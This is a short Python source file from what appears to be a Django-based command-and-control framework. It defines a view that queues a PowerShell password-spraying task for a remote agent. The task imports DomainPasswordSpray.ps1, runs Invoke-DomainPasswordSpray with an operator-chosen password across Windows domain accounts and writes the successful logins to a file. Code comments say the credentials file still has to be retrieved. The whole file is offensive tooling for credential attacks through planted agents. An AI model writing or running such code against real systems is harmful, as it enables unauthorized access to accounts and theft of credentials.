import os
from blog.views import *
from blog.models import *

current_path= os.path.dirname(os.path.abspath(__file__))

#### we need to download ../general/DomainPasswordSpray.ps1 on the windows machine


def pass_spray(request, agent='', password=''):
    if request.method=='POST':
        task = 'echo "===============Password Spraying===============";import-module c:\windows\temp\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -Password {} -OutFile spray_success -ErrorAction SilentlyContinue -Force'.format(password)
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()

        ### We need to get spray_success file
    else:
        return render(request, 'blog/listeners.html')
